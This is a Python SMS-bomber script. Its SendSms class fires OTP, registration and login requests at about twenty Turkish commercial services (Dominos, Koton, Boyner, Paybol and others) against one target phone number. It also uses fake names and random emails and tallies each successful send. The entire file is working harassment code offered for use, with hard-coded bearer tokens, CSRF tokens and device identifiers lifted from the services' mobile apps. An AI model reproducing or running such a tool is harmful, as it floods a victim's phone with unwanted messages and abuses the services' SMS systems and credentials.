from pickle import FALSE
import requests
from random import choice
from string import ascii_lowercase
from colorama import Fore, Style
false = False
true = True


class SendSms():
    adet = 0
    
    def __init__(self, phone, mail):
        self.phone = str(phone)
        if len(mail) != 0:
            self.mail = mail
        else:
            self.mail = ''.join(choice(ascii_lowercase) for i in range(19))+"@gmail.com"






    #apigw.chippin.com by ever0ne
    def Chippin(self):
        try:
            Chippin = requests.post("https://apigw.chippin.com/gsmVerification/generateGsmVerificationCode", 
                                   headers={"DeviceId":"76e95ca596a1eb1b","User-Agent":"okhttp/4.10.0"},  
                                   json={"gsm": self.phone})
            if Chippin.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> Chippin by ever0ne")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> Chippin by ever0ne")


    #api.kunduz.com by ever0ne
    def Kunduz(self):
        try:
            kunduz = requests.post("https://api.kunduz.com/auth/login/otp/",  json={"phone_number": {"country_code": 1,"number": self.phone}})
            if kunduz.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> kunduz by ever0ne")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> kunduz by ever0ne")


    #underarmour.com.tr by ever0ne
    def UnderArmour(self):
        try:
            underarmour = requests.post("https://www.underarmour.com.tr/users/register/", 
                                   headers={"User-Agent":"okhttp/4.10.0"},  
                                   json={"first_name": "ahmet","last_name": "bilen","email": self.mail,"password": "asd12Assss","phone": f"0{self.phone}","confirm": "true","sms_allowed": "true","email_allowed": "false","call_allowed": "false"})
            if underarmour.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> UnderArmour by ever0ne")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> UnderArmour by ever0ne")

            


    #frontend.dominos.com.tr by ever0ne
    def Dominos(self):
        try:
            dominos = requests.post("https://frontend.dominos.com.tr/api/customer/sendOtpCode", 
                                   headers={"authorization":"Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.BX34qfKYOZ6bx1UPMhB3de2qFM-R1l1oXpyKa_NzURkE3dI4qGGe5Q.Sa1Vih4fIDr6yxCcyHj2wA.qVyAYNf9nNOCCrmJAvZgl889UtmkyipBLMeWblJ8AQXolqMpuXoA8Ukx1DZKkLJ8BC8QAXn3oW3x52D51SFVp9FUeOE0cJwvd4Z5LUxypuuAECw4IkFqZ231da05z0JXidpdiLhT_mFjXj4iBD7D8bEQ5uMnVyLB6HKzRMJZl129iXjr1CxHdoZDkaN3aSv_7W7MQHHW7xihXurLnQcfe7I5exyOV_QQRoKlA9H04UHSNMDc2Gzs6alg9YGY7AOD-FtKePCTS-SPU6nz_yE7L7JeuG2KwIK4R3hmSHOlYSTNVG8SeXhGFyguAke_mQf7a6ocy-NumDSE39Eya6JqT6_pJc1uiidzGlPcBoRLVfhxRp0qsK5Wf5itAWg0q3ztc1T-daAMYUjlsc50rrNBjxpr4hfLoX2EXmAlN5t7We6T8K0cDtNxfNlkktrPMNpa3KeiHrqq0RehSrPC3X_i2RWGZjsm8Bjpywl6rcFHxLZZiDp1rdVuQrTdY1NQz5m_JzTWKg0GqXsrgeQp_aFDeQ.GPze6IpDWf5zyBzgI2kHpw","User-Agent":"okhttp/4.10.0"},  
                                   json={"mobilePhone": self.phone,"isSure": "true","email": self.mail})
            if dominos.json()["isSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> Dominos by ever0ne")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> Dominos by ever0ne")


            
    #mobileapi-redesign.boyner.com.tr by ever0ne
    def Boyner(self):
        try:
            boyner = requests.post("https://mobileapi-redesign.boyner.com.tr/mobile2/mbUser/RegisterUser", 
                                   headers={"User-Agent":"okhttp/4.10.0"},  
                                   json={"Main": {"CellPhone": self.phone,"Email": self.mail,"firstname": "ahmet","GenderID": 0,"lastname": "bilen","password": "asd21s","ReceiveCampaignMessages": "false"}})
            if boyner.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> Boyner by ever0ne")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> Boyner by ever0ne")
    
    
    #bim
    def Bim(self):
        try:
            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone})
            if bim.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bim.veesk.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bim.veesk.net")



    


                
    
    #KimGbIster
    def KimGb(self):
        try:
            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{self.phone}"})
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
            
        


    #tiklagelsin.com
    def TiklaGelsin(self):
        try:
            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
            headers = {"Content-Type": "application/json", "X-Merchant-Type": "0", "Accept": "*/*", "Appversion": "2.4.1", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "X-No-Auth": "true", "User-Agent": "TiklaGelsin/809 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Device-Type": "2"}
            json={"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": f"+90{self.phone}"}}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["data"]["generateOtp"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> svc.apps.tiklagelsin.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> svc.apps.tiklagelsin.com")


    #naosstars.com
    def Naosstars(self):
        try:
            url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
            headers = {"Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351", "User-Agent": "naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Access-Control-Allow-Origin": "*", "Locale": "en-TR", "Version": "1.0030", "Os": "ios", "Apiurl": "https://api.naosstars.com/api/", "Device-Id": "D41CE5F3-53BB-42CF-8611-B4FE7529C9BC", "Platform": "ios", "Accept-Language": "en-US,en;q=0.9", "Timezone": "Europe/Istanbul", "Globaluuidv4": "d57bd5d2-cf1e-420c-b43d-61117cf9b517", "Timezoneoffset": "-180", "Accept": "application/json", "Content-Type": "application/json; charset=utf-8", "Accept-Encoding": "gzip, deflate", "Apitype": "mobile_app"}
            json={"telephone": f"+90{self.phone}", "type": "register"}
            r = requests.post(url, headers=headers, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.naosstars.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.naosstars.com")


    #koton.com
    def Koton(self):
        try:
            url = "https://www.koton.com:443/users/register/"
            headers = {"Content-Type": "multipart/form-data; boundary=sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk", "X-Project-Name": "rn-env", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "en-US,en;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.koton.com/", "User-Agent": "Koton/1 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Csrftoken": "5DDwCmziQhjSP9iGhYE956HHw7wGbEhk5kef26XMFwhELJAWeaPK3A3vufxzuWcz"}
            data = f"--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"date_of_birth\"\r\n\r\n1993-07-02\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"call_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"gender\"\r\n\r\n\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--\r\n"
            r = requests.post(url, headers=headers, data=data)
            if r.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> koton.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> koton.com") 


    #paybol.com.tr
    def Paybol(self):
        try:
            url = "https://pyb-mobileapi.walletgate.io:443/v1/Account/RegisterPersonalAccountSendOtpSms"
            headers = {"Accept": "application/json", "Content-Type": "application/json", "User-Agent": "Paybol/1.2.1 (com.app.paybol; build:1; iOS 15.7.7) Alamofire/5.5.0", "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
            json={"phone_number": f"90{self.phone}"}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["status"] == 0:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> pyb-mobileapi.walletgate.io")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> pyb-mobileapi.walletgate.io")



    
    
    #porty.tech
    def Porty(self):
        try:
            url = "https://panel.porty.tech:443/api.php?"
            headers = {"Accept": "*/*", "Content-Type": "application/json; charset=UTF-8", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "User-Agent": "Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"}
            json={"job": "start_login", "phone": self.phone}
            r = requests.post(url=url, json=json, headers=headers)
            if r.json()["status"]== "success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> panel.porty.tech")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> panel.porty.tech")

            
    #istegelsin.com
    def Istegelsin(self):
        try:
            url = "https://prod.fasapi.net:443/"
            headers = {"Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded", "App-Version": "2528", "Accept-Encoding": "gzip, deflate", "Platform": "IOS", "User-Agent": "ig-sonkullanici-ios/161 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "en-US,en;q=0.9"}
            json={"operationName": "SendOtp2", "query": "mutation SendOtp2($phoneNumber: String!) {\n  sendOtp2(phoneNumber: $phoneNumber) {\n    __typename\n    alreadySent\n    remainingTime\n  }\n}", "variables": {"phoneNumber": f"90{self.phone}"}}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["data"]["sendOtp2"]["alreadySent"] == False:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> istegelsin.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> istegelsin.com")


    #evidea.com
    def Evidea(self):
        try:
            url = "https://www.evidea.com:443/users/register/"
            headers = {"Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.evidea.com/", "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"}
            data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
            r = requests.post(url, headers=headers, data=data)      
            if r.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> evidea.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> evidea.com") 


    #file.com.tr
    def File(self):
        try:
            url = "https://api.filemarket.com.tr:443/v1/otp/send"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Agent": "filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Os": "IOS", "X-Version": "1.7", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
            json={"mobilePhoneNumber": f"90{self.phone}"}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["responseType"] == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.filemarket.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.filemarket.com.tr")


    #komagene.com.tr
    def Komagene(self):
        try:
            url = "https://gateway.komagene.com.tr/auth/auth/smskodugonder"
            json={"Telefon": self.phone,"FirmaId": "32"}
            headers = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)"}
            r = requests.post(url=url, headers=headers, json=json)
            if r.json()["Success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gateway.komagene.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gateway.komagene.com.tr")